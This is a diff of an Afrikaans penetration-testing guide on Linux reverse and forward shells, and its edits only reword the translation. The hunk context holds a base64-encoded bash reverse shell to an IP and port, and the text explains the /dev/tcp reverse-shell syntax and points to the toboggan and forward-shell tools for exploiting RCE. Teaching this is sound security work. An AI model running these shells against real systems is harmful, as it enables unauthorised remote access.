@@ -35,8 +35,8 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Shell verduideliking
 
 1. **`bash -i`**: Hierdie deel van die opdrag begin 'n interaktiewe (`-i`) Bash-skal.
-2. **`>&`**: Hierdie deel van die opdrag is 'n kortnotasie vir **die herleiding van beide standaarduitset** (`stdout`) en **standaardfout** (`stderr`) na die **dieselfde bestemming**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Dit is 'n spesiale lêer wat **'n TCP-verbinding na die gespesifiseerde IP-adres en poort verteenwoordig**.
+2. **`>&`**: Hierdie deel van die opdrag is 'n afgekorte notasie vir **om beide standaarduitset** (`stdout`) en **standaardfout** (`stderr`) na die **dieselfde bestemming** te herlei.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Dit is 'n spesiale lêer wat **'n TCP-verbinding na die gespesifiseerde IP-adres en poort** verteenwoordig.
 - Deur **die uitset en foutstrome na hierdie lêer te herlei**, stuur die opdrag effektief die uitset van die interaktiewe skalsessie na die aanvaller se masjien.
 4. **`0>&1`**: Hierdie deel van die opdrag **herlei standaardinvoer (`stdin`) na die dieselfde bestemming as standaarduitset (`stdout`)**.
 
@@ -51,7 +51,7 @@ Wanneer jy met 'n **Remote Code Execution (RCE)** kwesbaarheid in 'n Linux-gebas
 
 'n Aanbevole hulpmiddel vir hierdie doel is [toboggan](https://github.com/n3rada/toboggan.git), wat interaksie met die teikenomgewing vereenvoudig.
 
-Om toboggan effektief te gebruik, skep 'n Python-module wat op die RCE-konteks van jou teikenstelsel aangepas is. Byvoorbeeld, 'n module genaamd `nix.py` kan as volg gestruktureer word:
+Om toboggan effektief te gebruik, skep 'n Python-module wat op die RCE-konteks van jou teikenstelsel afgestem is. Byvoorbeeld, 'n module genaamd `nix.py` kan as volg gestruktureer word:
 ```python3
 import jwt
 import httpx
@@ -79,9 +79,9 @@ En dan kan jy uitvoer:
 ```shell
 toboggan -m nix.py -i
 ```
-Om 'n interaktiewe skulp direk te benut. Jy kan `-b` byvoeg vir Burpsuite integrasie en die `-i` verwyder vir 'n meer basiese rce-wrapper.
+Om 'n interaktiewe skulp direk te benut. Jy kan `-b` vir Burpsuite integrasie byvoeg en die `-i` verwyder vir 'n meer basiese rce-wrapper.
 
-'n Ander moontlikheid is om die `IppSec` voorwaartse skulp implementering te gebruik [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+'n Ander moontlikheid is om die `IppSec` vorentoe skulp implementering te gebruik [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Jy moet net die volgende aanpas:
 
